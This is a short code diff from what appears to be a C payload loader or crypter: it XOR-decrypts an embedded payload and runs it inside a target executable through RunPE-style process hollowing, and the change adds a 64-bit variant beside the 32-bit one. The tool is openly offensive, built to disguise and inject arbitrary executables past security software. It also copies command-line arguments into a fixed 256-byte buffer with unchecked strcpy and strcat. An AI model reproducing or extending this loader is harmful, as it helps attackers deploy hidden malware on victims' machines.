@@ -149,8 +149,7 @@ int main (int argc, char **argv)
 		#ifdef XOR_OBFUSCATION
 			// Decrypt payload
 			// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
-			for(long i=0; i < payloadSize; i++)
-			{
+			for(long i=0; i < payloadSize; i++) {
 				payload[i] = payload[i] ^ keyByte;
 			}	
 		#endif
@@ -161,18 +160,19 @@ int main (int argc, char **argv)
 		char commandLine [256];
 		strcpy(commandLine, argv[1]);
 	
-		if(!argv[2]) 
-		{
-			// Handle empty command line arguments for payload executable
-			// Relevant if user does not specify "" as second bfg argument
-			newRunPE32(argv[1], payload, commandLine);
-		} else
-		{
-			// Instanciate and pass command line arguments
+		// Handle empty command line arguments for payload executable
+		// Relevant if user does not specify "" as second bfg argument
+		if(argv[2]) {
 			strcat(commandLine, " ");
 			strcat(commandLine, argv[2]);
-			newRunPE32(argv[1], payload, commandLine);
 		}	
+			
+		// Instanciate target and pass command line arguments
+		#ifdef X64
+			newRunPE64(argv[1], payload, commandLine);	
+		#else
+			newRunPE32(argv[1], payload, commandLine);
+		#endif	
 	#endif
 
 	#ifdef LOADEXEC_DLL
